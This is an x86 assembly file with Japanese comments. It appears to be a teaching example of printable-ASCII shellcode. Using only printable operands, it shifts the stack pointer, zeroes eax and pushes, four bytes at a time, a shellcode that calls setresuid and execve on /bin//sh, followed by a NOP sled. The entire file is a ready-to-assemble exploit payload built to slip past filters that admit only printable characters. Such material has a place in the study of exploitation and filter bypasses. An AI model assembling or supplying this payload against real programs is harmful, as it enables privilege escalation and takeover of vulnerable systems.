BITS 32
push esp                ; 現在のespを
pop eax                 ;   eaxに設定する。
sub eax,0x39393333      ; eaxに860を加算するために、
sub eax,0x72727550      ;   印字可能値を減算する。
sub eax,0x54545421
push eax                ; eaxをespに戻す。
pop esp                 ;   実質的にesp = esp + 860となる。
and eax,0x454e4f4a
and eax,0x3a313035      ; eaxをゼロクリアする。

sub eax,0x346d6d25      ; eax = 0x80cde189にするために、
sub eax,0x256d6d25      ;   印字可能値を減算する。
sub eax,0x2557442d      ;   （shellcode.binの末尾4バイト）
push eax                ; このバイト群をespの指す場所にプッシュする。
sub eax,0x59316659      ; さらに印字値を減算して
sub eax,0x59667766      ;  eax = 0x53e28951にする。
sub eax,0x7a537a79      ;  （シェルコードの末尾の手前にある4バイト）
push eax
sub eax,0x25696969
sub eax,0x25786b5a
sub eax,0x25774625
push eax                ; eax = 0xe3896e69
sub eax,0x366e5858
sub eax,0x25773939
sub eax,0x25747470
push eax                ; eax = 0x622f6868
sub eax,0x25257725
sub eax,0x71717171
sub eax,0x5869506a
push eax                ; eax = 0x732f2f68
sub eax,0x63636363
sub eax,0x44307744
sub eax,0x7a434957
push eax                ; eax = 0x51580b6a
sub eax,0x63363663
sub eax,0x6d543057
push eax                ; eax = 0x80cda4b0
sub eax,0x54545454
sub eax,0x304e4e25
sub eax,0x32346f25
sub eax,0x302d6137
push eax                ; eax = 0x99c931db
sub eax,0x78474778
sub eax,0x78727272
sub eax,0x774f4661
push eax                ; eax = 0x31c03190
sub eax,0x41704170
sub eax,0x2d772d4e
sub eax,0x32483242
push eax                ; eax = 0x90909090
push eax
push eax                ; NOPスレッドを構築する。
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
